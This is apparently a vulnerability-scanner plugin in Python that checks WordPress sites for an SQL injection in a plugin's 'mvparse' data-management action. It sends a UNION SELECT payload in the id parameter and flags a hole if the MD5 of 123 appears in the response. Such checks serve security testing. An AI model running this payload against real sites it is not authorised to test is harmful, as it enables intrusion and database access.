#!/usr/bin/env python
# -*- coding: utf-8 -*-
#by lkz

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = '?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1%20union%20all%20select%20MD5(123),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'
    url = arg + payload
    code,head,body, _,_ = curl.curl(url)
    if code == 200 and '202cb962ac59075b964b07152d234b70' in body:
        security_hole(payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress','http://www.example.com/')[1])